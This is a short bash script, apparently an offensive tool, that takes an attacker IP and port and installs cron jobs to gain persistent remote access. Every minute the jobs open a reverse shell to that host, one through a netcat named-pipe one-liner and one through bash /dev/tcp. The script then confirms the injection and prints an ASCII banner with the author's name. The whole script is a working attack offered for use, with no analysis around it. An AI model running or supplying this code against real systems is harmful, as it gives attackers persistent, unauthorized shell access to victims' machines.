#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
ENDCOLOR="\e[0m"

$_REQUEST="$_REQUEST"


if [ -z $1 ]
then
	echo -e "${RED}[*] Syntax: <ATTACKER IP> <PORT> ${ENDCOLOR}"
    exit 1
fi

if [ -z $2 ]
then
    echo -e "${RED}[*] Syntax: <ATTACKER IP> <PORT> ${ENDCOLOR}"
    exit 1
fi


echo -e "Injecting Code...\n"

{ crontab -l; echo "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"; } | crontab - > /dev/null 2>&1
{ crontab -l; echo "* * * * * bash -i >& /dev/tcp/$1/$2 0>&1"; } | crontab - > /dev/null 2>&1
crontab -l | grep '* * * * * rm /tmp/f;mkfifo /tmp/f;cat' > /dev/null 2>&1

a=$(echo $?)
if [[ $a =~ 0 ]]
then

echo -e "${GREEN}[+] CODE INJECTED SUCCESSFULY${ENDCOLOR}\n"
printf"${GREEN}                   oOo 
                             oO
                               o
        |^^^^^^^^^^^^^^^^^^^^^^|____
        | Made by :~ Sagar Khasa |**\___,
        |________________________|__|)__|
        |(@)(@)'''''''''''**|(@)(@)**|(@)
        = = = = = = = = = = = = = = = = = = ="
	
